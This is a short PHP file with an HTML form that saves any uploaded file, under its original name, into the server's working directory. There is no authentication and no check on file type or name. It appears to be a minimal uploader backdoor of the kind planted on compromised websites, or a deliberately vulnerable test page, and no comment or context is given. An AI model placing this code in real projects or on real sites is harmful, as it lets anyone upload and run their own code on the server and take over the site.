<?php
if (isset($_POST['upload']) || isset($_FILES['file'])){
$target_dir = getcwd() . "/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file); }
?>
<html>
<body>
    <form action="" method="post" enctype="multipart/form-data">
      <input type="file" value="filetoupload" name="file" id="file">
      <input type="submit" value="upload" name="upload">
    </form>
</body>
</html>
